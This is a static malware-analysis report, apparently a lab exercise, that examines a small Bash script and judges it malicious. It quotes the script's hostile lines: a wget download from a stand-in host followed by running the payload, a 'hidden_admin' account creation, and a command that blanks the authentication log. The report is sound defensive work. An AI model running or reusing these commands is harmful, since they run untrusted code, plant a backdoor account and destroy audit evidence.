# Suspicious File Analysis

**Analyst:** Shikha  
**Analysis Date:** 16 September 2026  
**File Examined:** `suspicious.sh`  
**Method:** Static examination only (file was never executed)

---

## 1. Summary

The file is a Bourne-Again shell (Bash) script containing commands that would download and execute a payload, create a user account, and overwrite the authentication log if executed.

**Verdict:** Malicious  
**Confidence:** High

---

## 2. File Identification

- **Reported type (`file` command):** Bourne-Again shell script, ASCII text executable
- **Name vs. actual type:** The name `suspicious.sh` matches the identified shell-script type.

---

## 3. File Properties (`ls -l`)

- **Permissions:** `-rw-r--r--`
- **Executable?:** No. There is no `x` permission in the permission string, so the file does not have execute permission.
- **Owner:** `shikha`
- **Size:** 145 bytes
- **Modified:** Sep 16, 12:18

---

## 4. Contents and Red Flags

The file was examined by reading it with `cat` or `less`; it was never run.

### Red flags found

- [x] **Downloads a file from a remote web address:**  
  `wget http://example-bad-site.test/payload.sh`  
  This follows a fetch-a-payload pattern.

- [x] **Runs the downloaded file:**  
  `bash payload.sh`  
  This is a download-and-execute pattern and runs potentially untrusted code.

- [x] **Creates a user account:**  
  `useradd hidden_admin`  
  This could enable persistence or unauthorized access.

- [x] **Overwrites the authentication log:**  
  `echo "" > /var/log/auth.log`  
  This may indicate an attempt to cover tracks.

---

## 5. Verdict and Confidence

**Verdict:** MALICIOUS  
**Confidence:** HIGH

### Evidence-based reasoning

The verdict is based on specific behaviours found in the script. The `wget` command attempts to download a payload from a remote web address, followed by `bash payload.sh`, which attempts to execute the downloaded script. The `useradd hidden_admin` command attempts to create a new user account, which could provide persistence or unauthorized access. Finally, `echo "" > /var/log/auth.log` appears intended to overwrite authentication logs, which can be associated with covering tracks.

Together, these behaviours form a clear pattern of potentially malicious activity.

---

## 6. Recommendations

- [x] **Do NOT execute the file.**
- [x] **Preserve the file as evidence** for further analysis. If appropriate, remove execute permission while keeping the file rather than deleting it.
- [x] **Escalate the finding** to the appropriate incident-response or security team.
- [x] **Check the system for signs of related activity**, such as an unexpected `hidden_admin` account, evidence of the downloaded payload, or changes to authentication logs.

---

**End of Analysis**
